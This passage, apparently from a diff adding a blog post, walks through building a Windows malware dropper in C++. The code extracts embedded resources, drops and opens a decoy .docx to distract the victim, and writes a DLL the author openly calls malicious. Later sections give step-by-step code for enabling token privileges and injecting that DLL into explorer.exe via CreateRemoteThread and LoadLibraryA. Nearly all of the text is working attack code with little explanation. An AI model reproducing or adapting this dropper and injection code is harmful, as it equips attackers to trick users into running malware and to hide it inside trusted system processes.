+	ResourceGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DLL_ResourceGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> DLL_Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	FileSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DLL_FileSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> DLL_Resource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+	LPVOID PFILE <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>ResourceGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	LPVOID Shellcode_Buf <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>DLL_ResourceGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token function">GetModuleFileNameA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> PathFileName<span class="token punctuation">,</span> MAX_PATH<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">strcpy_s</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>PathFileName<span class="token punctuation">,</span> <span class="token char">'\\'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAX_PATH<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>FileName<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span>
+		<span class="token punctuation">&#123;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'d'</span><span class="token punctuation">;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'o'</span><span class="token punctuation">;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'c'</span><span class="token punctuation">;</span>
+			FileName<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'x'</span><span class="token punctuation">;</span>
+			<span class="token keyword">break</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token comment">// Create a file and write the resource in it</span>
+	HANDLE FILE <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> FILE_ALL_ACCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_ALWAYS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DWORD dwSize<span class="token punctuation">;</span>
+	<span class="token function">WriteFile</span><span class="token punctuation">(</span>FILE<span class="token punctuation">,</span> PFILE<span class="token punctuation">,</span> FileSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+	<span class="token comment">// Create DLL FILE</span>
+
+
+
+	<span class="token comment">// open the docx file</span>
+	SHELLEXECUTEINFOA shellexc <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	shellexc<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellexc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	shellexc<span class="token punctuation">.</span>lpFile <span class="token operator">=</span> FileName<span class="token punctuation">;</span>
+	shellexc<span class="token punctuation">.</span>nShow <span class="token operator">=</span> SW_SHOW<span class="token punctuation">;</span>
+	<span class="token function">ShellExecuteExA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellexc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	HANDLE DLLFILE <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>Dllpath<span class="token punctuation">,</span> FILE_ALL_ACCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> CREATE_ALWAYS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	DWORD dllSize<span class="token punctuation">;</span>
+	<span class="token function">WriteFile</span><span class="token punctuation">(</span>DLLFILE<span class="token punctuation">,</span> Shellcode_Buf<span class="token punctuation">,</span> DLL_FileSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dllSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>DLLFILE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="How-we-inject-the-malicious-in-explorer-exe-process"><a href="#How-we-inject-the-malicious-in-explorer-exe-process" class="headerlink" title="How we inject the malicious in explorer.exe process?"></a>How we inject the malicious in explorer.exe process?</h3><ol>
+<li>Make sure we have high privilege to inject or we will inject failed.</li>
+<li>Load Malicious DLL</li>
+<li>Open explorer.exe handle</li>
+<li>Allocate the <strong>READ WRITE EXECUTABLE</strong> memory for DLL</li>
+<li>Get LoadLibaryA function address from kernel32.dll</li>
+<li>Create remote thread under the explorer.exe process.</li>
+</ol>
+<h4 id="Escalate-Privilege-part"><a href="#Escalate-Privilege-part" class="headerlink" title="Escalate Privilege part"></a>Escalate Privilege part</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// initialize variable</span>
+
+	HANDLE hToken <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	LUID luidValue <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	TOKEN_PRIVILEGES tokenPrivileges <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	BOOL bRet <span class="token operator">=</span> FALSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Check if we get the high privilege like administrator</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">bRet <span class="token operator">=</span> <span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hToken<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>bRet <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"OpenProcessToken"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// Get Local System pszPrivileges LUID Value</span>
+bRet <span class="token operator">=</span> <span class="token function">LookupPrivilegeValueA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> pszPrivilegesName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>luidValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>bRet <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"LookupPrivilegeValueA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If we get the look up privilege value, we can try to impore our privilege in program</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Set Improve Privileges info</span>
+	tokenPrivileges<span class="token punctuation">.</span>PrivilegeCount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+	tokenPrivileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Luid <span class="token operator">=</span> luidValue<span class="token punctuation">;</span>
+	tokenPrivileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Attributes <span class="token operator">=</span> SE_PRIVILEGE_ENABLED<span class="token punctuation">;</span>
+
+	<span class="token comment">// Privilege Escalation</span>
+	bRet <span class="token operator">=</span> <span class="token function">AdjustTokenPrivileges</span><span class="token punctuation">(</span>hToken<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tokenPrivileges<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>bRet <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"AdjustTokenPrivileges"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		dwRet <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRet <span class="token operator">==</span> ERROR_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dwRet <span class="token operator">==</span> ERROR_NOT_ALL_ASSIGNED<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"ERROR_NOT_ALL_ASSIGNED"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Whole escalate privilege part</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">BOOL <span class="token function">EnablePrivileges</span><span class="token punctuation">(</span>HANDLE hProcess<span class="token punctuation">,</span> LPCSTR pszPrivilegesName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+	HANDLE hToken <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	LUID luidValue <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	TOKEN_PRIVILEGES tokenPrivileges <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	BOOL bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
+	DWORD dwRet <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+	bRet <span class="token operator">=</span> <span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hToken<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>bRet <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"OpenProcessToken"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token comment">// Get Local System pszPrivileges LUID Value</span>
+	bRet <span class="token operator">=</span> <span class="token function">LookupPrivilegeValueA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> pszPrivilegesName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>luidValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>bRet <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"LookupPrivilegeValueA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token comment">// Set Improve Privileges info</span>
+	tokenPrivileges<span class="token punctuation">.</span>PrivilegeCount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+	tokenPrivileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Luid <span class="token operator">=</span> luidValue<span class="token punctuation">;</span>
+	tokenPrivileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Attributes <span class="token operator">=</span> SE_PRIVILEGE_ENABLED<span class="token punctuation">;</span>
+
+	<span class="token comment">// Privilege Escalation</span>
+	bRet <span class="token operator">=</span> <span class="token function">AdjustTokenPrivileges</span><span class="token punctuation">(</span>hToken<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tokenPrivileges<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>bRet <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"AdjustTokenPrivileges"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		dwRet <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwRet <span class="token operator">==</span> ERROR_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dwRet <span class="token operator">==</span> ERROR_NOT_ALL_ASSIGNED<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"ERROR_NOT_ALL_ASSIGNED"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Inject-DLL-part"><a href="#Inject-DLL-part" class="headerlink" title="Inject DLL part"></a>Inject DLL part</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Initialize variable</span>
+	HANDLE hProcess <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	SIZE_T dwSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	LPVOID pDllAddr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	FARPROC pFuncProcAddr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Allocate the memory</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//allocated memory in the injection process</span>
+	dwSize <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	pDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> pDllAddr<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"VirtualAllocEx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Write the malicious DLL file in the process</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//Write data to the allocated memory</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>FALSE <span class="token operator">==</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pDllAddr<span class="token punctuation">,</span> pszDllFileName<span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"WriteProcessMemory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Get load DLL file function address</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Get LoadLibraryA function address</span>
+	pFuncProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>L<span class="token string">"kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> pFuncProcAddr<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress_LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Create thread under the process</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Use CreateRemoteThread to create a remote thread and implement DLL injection</span>
+	HANDLE hRemoteThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pFuncProcAddr<span class="token punctuation">,</span> pDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> hRemoteThread<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"CreateRemoteThread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">// Close handle</span>
+	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>the whole inject function part</p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">BOOL <span class="token function">CreateRemoteThreadInjectDll</span><span class="token punctuation">(</span>DWORD dwProcessId<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> pszDllFileName<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	HANDLE hProcess <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	SIZE_T dwSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	LPVOID pDllAddr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+	FARPROC pFuncProcAddr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+
+	<span class="token comment">// Get Process Handle</span>
+	hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> hProcess<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"OpenProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">//allocated memory in the injection process</span>
+	dwSize <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	pDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> pDllAddr<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"VirtualAllocEx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">//Write data to the allocated memory</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>FALSE <span class="token operator">==</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pDllAddr<span class="token punctuation">,</span> pszDllFileName<span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"WriteProcessMemory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">// Get LoadLibraryA function address</span>
+	pFuncProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>L<span class="token string">"kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> pFuncProcAddr<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress_LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">// Use CreateRemoteThread to create a remote thread and implement DLL injection</span>
+	HANDLE hRemoteThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pFuncProcAddr<span class="token punctuation">,</span> pDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> hRemoteThread<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"CreateRemoteThread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">// Close handle</span>
+	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
